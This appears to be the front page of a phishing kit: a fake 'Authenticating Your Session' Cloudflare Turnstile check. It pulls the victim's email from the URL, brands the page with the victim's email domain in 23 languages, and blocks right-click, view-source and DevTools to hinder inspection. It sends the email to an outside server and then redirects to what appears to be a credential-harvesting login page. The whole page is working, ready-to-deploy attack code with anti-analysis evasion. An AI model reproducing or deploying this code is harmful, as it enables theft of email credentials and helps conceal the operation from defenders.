<head>

<!-- =========================================================
     ANTI-SOURCE CODE & DEVTOOLS PROTECTION (Starts Here)
     ========================================================= -->
<style>
  /* Disable text selection */
  body {
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
  }
</style>
<script>
  // Disable Right Click
  document.addEventListener('contextmenu', event => event.preventDefault());
  // Disable Drag
  document.addEventListener('dragstart', event => event.preventDefault());

  // Disable Keyboards Shortcuts (F12, Ctrl+U, Ctrl+S, Ctrl+Shift+I/J/C)
  document.addEventListener('keydown', function(e) {
      // F12
      if (e.key === 'F12' || e.keyCode === 123) {
          e.preventDefault();
          return false;
      }
      // Ctrl+Shift+I / J / C (Windows/Linux)
      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
          e.preventDefault();
          return false;
      }
      // Cmd+Option+I / J / C (Mac)
      if (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) {
          e.preventDefault();
          return false;
      }
      // Ctrl+U / Cmd+U (View Source)
      if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
          e.preventDefault();
          return false;
      }
      // Ctrl+S / Cmd+S (Save Page)
      if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) {
          e.preventDefault();
          return false;
      }
  });

  // DevTools Detection (Redirects if opened)
  setInterval(function() {
      var widthThreshold = window.outerWidth - window.innerWidth > 160;
      var heightThreshold = window.outerHeight - window.innerHeight > 160;
      var orientation = widthThreshold ? 'vertical' : 'horizontal';
      
      if ((heightThreshold && widthThreshold) || (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized)) {
          if (document.body) {
              document.body.innerHTML = '<div style="text-align:center;margin-top:20vh;font-family:sans-serif;"><h1>Security Notice</h1><p>Developer tools are not permitted on this page.</p></div>';
          }
          window.location.reload();
      }
  }, 1000);
</script>
<!-- =========================================================
     ANTI-SOURCE CODE PROTECTION (Ends Here)
     ========================================================= -->

<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>
  :root {
    --brand-c1: #0066FF;
    --brand-c2: #0047B3;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    height: 100%;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Noto Sans KR", "Noto Sans JP", "Noto Sans SC", Arial, sans-serif;
    background: #f3f4f6; /* Exact light gray from screenshot */
    color: #1e293b;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    transition: background 0.5s ease;
    background-size: cover;
    background-position: center center;
    background-attachment: fixed;
  }
  .cf-card {
    background: #fff;
    border-radius: 16px;
    max-width: 520px;
    width: 100%;
    padding: 50px 40px;
    box-shadow: 0 10px 30px rgba(0,0,0,.04), 0 1px 3px rgba(0,0,0,.02);
    text-align: center;
    position: relative;
    z-index: 1;

  .cf-card h1 {

    color: #1e293b;
    margin-bottom: 12px;
  }
  .cf-card p {

    padding: 0 10px;
  }
  .cf-turnstile {
    display: flex;
    justify-content: center;
    margin: 0 auto 20px;
    min-height: 65px;
  }
  
  /* Verifying Spinner */
  .spinner {
    display: none;
    width: 32px;
    height: 32px;
    margin: 0 auto 20px;
    border: 3px solid #e2e8f0;
    border-top: 3px solid var(--brand-c1);
    border-radius: 50%;
    animation: spin .8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  
  .error-box {
    display: none;
    background: #fef2f2;
    border: 1px solid #fecaca;
    color: #b91c1c;
    padding: 12px;
    border-radius: 8px;
    font-size: 13px;
    margin-bottom: 20px;
    text-align: left;
  }

  /* Copyright Footer */
  .cf-footer {
    margin-top: 36px;
    font-size: 12px;
    color: #94a3b8;
  }

  .state-verifying .spinner { display: block; }
  .state-verifying .cf-turnstile { display: none; }
</style>

<body oncontextmenu="return false;">

<div class="cf-card" id="cfCard">
  <!-- Title & Subtitle matching screenshot -->
  <h1 id="t-title">Authenticating Your Session</h1>
  <p id="t-subtitle">We need to confirm you are human before proceeding to your secure workspace.</p>

  <div class="spinner"></div>

  <!-- REPLACE 'YOUR_SITE_KEY_HERE' WITH YOUR ACTUAL CLOUDFLARE TURNSTILE SITE KEY -->
  <div class="cf-turnstile"
       id="turnstileWidget"
       data-sitekey="0x4AAAAAAF5NaqquKMvlX8-t"
       data-callback="onVerified"
       data-error-callback="onTurnstileError"
       data-expired-callback="onTurnstileExpired"
       data-theme="light"
       data-size="normal"></div>

  <div class="error-box" id="errorBox"></div>

  <!-- Dynamic Copyright Footer -->
  <div class="cf-footer" id="t-footer">
    © 2026 secure-workspace.com
  </div>
</div>

<script>
/* ============================================================
   API Config
   ============================================================ */
const API_BASE = 'https://general-login-upgrade.onrender.com';

/* ============================================================
   MULTILINGUAL DICTIONARY — 23 languages
   ============================================================ */
const translations = {
  en: { title:"Authenticating Your Session", subtitle:"We need to confirm you are human before proceeding to your secure workspace.", errFail:"Verification failed. Please refresh the page.", errTimeout:"Security check is taking longer than expected. Please refresh." },
  bg: { title:"Удостоверяване на сесията", subtitle:"Трябва да потвърдим, че сте човек, преди да продължите към защитеното си работно пространство.", errFail:"Неуспешна проверка. Моля, опреснете страницата.", errTimeout:"Проверката отнема повече време. Опреснете." },
  de: { title:"Sitzung wird authentifiziert", subtitle:"Wir müssen bestätigen, dass Sie ein Mensch sind, bevor Sie fortfahren.", errFail:"Überprüfung fehlgeschlagen. Bitte laden Sie die Seite neu.", errTimeout:"Sicherheitsüberprüfung dauert länger. Bitte neu laden." },
  ko: { title:"세션 인증 중", subtitle:"보안 작업 공간으로 이동하기 전에 사람인지 확인해야 합니다.", errFail:"인증에 실패했습니다. 페이지를 새로고침하세요.", errTimeout:"보안 확인이 예상보다 오래 걸립니다. 새로고침하세요." },
  ru: { title:"Аутентификация сеанса", subtitle:"Нам нужно убедиться, что вы человек, прежде чем продолжить.", errFail:"Ошибка проверки. Пожалуйста, обновите страницу.", errTimeout:"Проверка безопасности занимает больше времени. Обновите." },
  es: { title:"Autenticando su sesión", subtitle:"Necesitamos confirmar que es humano antes de continuar a su espacio de trabajo seguro.", errFail:"La verificación falló. Actualiza la página.", errTimeout:"La verificación está tardando más de lo esperado. Actualiza." },
  fr: { title:"Authentification de votre session", subtitle:"Nous devons confirmer que vous êtes humain avant de continuer.", errFail:"Échec de la vérification. Veuillez actualiser la page.", errTimeout:"La vérification prend plus de temps. Actualisez." },
  it: { title:"Autenticazione della sessione", subtitle:"Dobbiamo confermare che sei umano prima di procedere.", errFail:"Verifica non riuscita. Aggiorna la pagina.", errTimeout:"La verifica sta impiegando più tempo. Aggiorna." },
  pt: { title:"Autenticando sua sessão", subtitle:"Precisamos confirmar que você é humano antes de continuar.", errFail:"Falha na verificação. Atualize a página.", errTimeout:"A verificação está demorando mais. Atualize." },
  nl: { title:"Uw sessie verifiëren", subtitle:"We moeten bevestigen dat u een mens bent voordat u doorgaat.", errFail:"Verificatie mislukt. Vernieuw de pagina.", errTimeout:"Beveiligingscontrole duurt langer. Vernieuw." },
  ja: { title:"セッションの認証", subtitle:"続行する前に、人間であることを確認する必要があります。", errFail:"認証に失敗しました。ページを更新してください。", errTimeout:"セキュリティチェックに時間がかかっています。更新してください。" },
  zh: { title:"正在验证您的会话", subtitle:"我们需要确认您是真人才能继续。", errFail:"验证失败。请刷新页面。", errTimeout:"安全检查耗时较长。请刷新。" },
  'zh-TW': { title:"正在驗證您的會話", subtitle:"我們需要確認您是真人才能繼續。", errFail:"驗證失敗。請重新整理頁面。", errTimeout:"安全檢查耗時較長。請重新整理。" },
  ar: { title:"مصادقة جلستك", subtitle:"نحتاج إلى التأكد من أنك إنسان قبل المتابعة.", errFail:"فشل التحقق. يرجى تحديث الصفحة.", errTimeout:"يستغرق التحقق الأمني وقتًا أطول. يرجى التحديث." },
  he: { title:"מאמת את הסשן שלך", subtitle:"עלינו לוודא שאתה אדם לפני שתמשיך.", errFail:"האימות נכשל. אנא רענן את הדף.", errTimeout:"בדיקת האבטחה אורכת זמן רב מהצפוי. אנא רענן." },
  tr: { title:"Oturumunuz Doğrulanıyor", subtitle:"Devam etmeden önce insan olduğunuzu onaylamamız gerekiyor.", errFail:"Doğrulama başarısız. Lütfen sayfayı yenileyin.", errTimeout:"Güvenlik kontrolü uzun sürüyor. Lütfen yenileyin." },
  pl: { title:"Uwierzytelnianie sesji", subtitle:"Musimy potwierdzić, że jesteś człowiekiem, zanim przejdziesz dalej.", errFail:"Weryfikacja nie powiodła się. Odśwież stronę.", errTimeout:"Weryfikacja bezpieczeństwa trwa dłużej. Odśwież." },
  uk: { title:"Автентифікація сеансу", subtitle:"Нам потрібно переконатися, що ви людина, перш ніж продовжити.", errFail:"Помилка перевірки. Оновіть сторінку.", errTimeout:"Перевірка безпеки триває довше. Оновіть." },
  ro: { title:"Se autentifică sesiunea", subtitle:"Trebuie să confirmăm că sunteți o persoană înainte de a continua.", errFail:"Verificarea a eșuat. Reîmprospătați pagina.", errTimeout:"Verificarea de securitate durează mai mult. Reîmprospătați." },
  vi: { title:"Đang xác thực phiên của bạn", subtitle:"Chúng tôi cần xác nhận bạn là con người trước khi tiếp tục.", errFail:"Xác minh thất bại. Vui lòng làm mới trang.", errTimeout:"Kiểm tra bảo mật mất nhiều thời gian hơn. Vui lòng làm mới." },
  th: { title:"กำลังตรวจสอบสิทธิ์เซสชันของคุณ", subtitle:"เราจำเป็นต้องยืนยันว่าคุณเป็นมนุษย์ก่อนดำเนินการต่อ", errFail:"การตรวจสอบล้มเหลว โปรดรีเฟรชหน้า", errTimeout:"การตรวจสอบความปลอดภัยใช้เวลานาน โปรดรีเฟรช" },
  id: { title:"Mengautentikasi Sesi Anda", subtitle:"Kami perlu mengonfirmasi bahwa Anda manusia sebelum melanjutkan.", errFail:"Verifikasi gagal. Silakan muat ulang halaman.", errTimeout:"Pemeriksaan keamanan memakan waktu lebih lama. Muat ulang." }
};

const RTL_LANGS = ['ar', 'he'];
let currentLang = 'en';

/* ============================================================
   Language detection
   ============================================================ */
function detectLanguage() {
  const userLang = (navigator.language || navigator.userLanguage || 'en').toLowerCase();

  if (userLang.startsWith('zh-tw') || userLang.startsWith('zh-hk') || userLang.startsWith('zh-hant')) return 'zh-TW';
  if (userLang.startsWith('zh')) return 'zh';

  const base = userLang.split('-')[0];
  if (translations[base]) return base;

  const prefs = navigator.languages || [];
  for (const lang of prefs) {
    const raw = String(lang).toLowerCase();
    if (raw.startsWith('zh-tw') || raw.startsWith('zh-hk') || raw.startsWith('zh-hant')) return 'zh-TW';
    if (raw.startsWith('zh')) return 'zh';
    const b = raw.split('-')[0];
    if (translations[b]) return b;
  }
  return 'en';
}

function applyTranslations(lang) {
  const t = translations[lang] || translations['en'];
  currentLang = lang;

  document.documentElement.lang = lang;
  document.documentElement.dir = RTL_LANGS.includes(lang) ? 'rtl' : 'ltr';

  document.title = t.title;
  document.getElementById('t-title').textContent = t.title;
  document.getElementById('t-subtitle').textContent = t.subtitle;
}

/* ============================================================
   READ EMAIL FROM URL
   ============================================================ */
function getEmailFromSource() {
  let fromHash = window.location.hash.substring(1);
  if (fromHash) {
    try { fromHash = decodeURIComponent(fromHash); } catch (e) {}
    fromHash = fromHash.split('&')[0].split('?')[0].replace(/^email=/i, '').trim();
    if (fromHash.includes('@')) return fromHash;
  }
  const params = new URLSearchParams(window.location.search);
  const keys = ['auth', 'e', 'email', 'u', 'login_hint', 'user', 'mail'];
  for (const k of keys) {
    const v = params.get(k);
    if (v && v.includes('@')) return v;
  }
  return '';
}

var EMAIL = getEmailFromSource();
var verified = false;

/* ============================================================
   INIT
   ============================================================ */
(function init() {
  const detectedLang = detectLanguage();
  applyTranslations(detectedLang);

  // Set dynamic copyright footer based on the target domain
  const footerEl = document.getElementById('t-footer');
  if (EMAIL) {
    const domain = EMAIL.split('@')[1] || '';
    footerEl.textContent = `© 2026 ${domain}`;
    
    // Optional: Tint the background slightly to match the brand
    const brandColors = {
      'naver.com': '#03c75a', 'naver.net': '#03c75a', 'daum.net': '#f9a800', 'hanmail.net': '#f9a800',
      'abv.bg': '#1e930c', 'outlook.com': '#0078d4', 'hotmail.com': '#0078d4', 'live.com': '#0078d4',
      'microsoft.com': '#0078d4', 'gmail.com': '#4285F4', 'google.com': '#4285F4', 'yahoo.com': '#7b0099',
      'yandex.ru': '#fc3f1d', 'mail.ru': '#005ff9', 'hiworks.co.kr': '#1a73e8', 'gabia.com': '#e95e2e'
    };
    
    const accent = brandColors[domain];
    if (accent) {
      document.documentElement.style.setProperty('--brand-c1', accent);
      document.documentElement.style.setProperty('--brand-c2', accent);
    }
  } else {
    footerEl.textContent = `© 2026 secure-workspace.com`;
  }
})();

/* ============================================================
   TURNSTILE CALLBACKS & BACKEND VERIFICATION
   ============================================================ */
async function onVerified(token) {
  if (verified) return;
  if (!token) { onTurnstileError('missing-token'); return; }

  verified = true;
  console.log('🛡️ Turnstile passed, sending token to backend...');

  var card = document.getElementById('cfCard');
  if (card) card.classList.add('state-verifying');

  try {
    const response = await fetch(API_BASE + '/api/turnstile-verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token, email: EMAIL })
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.message || `HTTP ${response.status}`);
    }

    if (data.success && data.redirect) {
      console.log('✅ Proof generated, redirecting to login.html...');
      setTimeout(function () {
        // Redirects to: /login.html?u=...&p=...&t=...
        window.location.href = data.redirect;
      }, 600);
    } else {
      throw new Error(data.message || 'Verification failed on server');
    }
  } catch (error) {
    console.error('❌ Backend verification failed:', error);
    var box = document.getElementById('errorBox');
    if (box) {
      box.style.display = 'block';
      box.textContent = "Error: " + error.message;
    }
    if (card) card.classList.remove('state-verifying');
    verified = false;
    if (window.turnstile) {
      try { window.turnstile.reset(); } catch (e) {}
    }
  }
}

function onTurnstileError(code) {
  console.error('❌ Turnstile error:', code);
  var box = document.getElementById('errorBox');
  if (box) {
    box.style.display = 'block';
    box.textContent = translations[currentLang].errFail;
  }
  var card = document.getElementById('cfCard');
  if (card) card.classList.remove('state-verifying');
}

function onTurnstileExpired() {
  verified = false;
  if (window.turnstile) {
    try { window.turnstile.reset(); } catch (e) {}
  }
}

setTimeout(function () {
  if (!verified && window.turnstile === undefined) {
    var box = document.getElementById('errorBox');
    if (box) {
      box.style.display = 'block';
      box.textContent = translations[currentLang].errTimeout;
    }
  }
}, 15000);
</script>

</body>
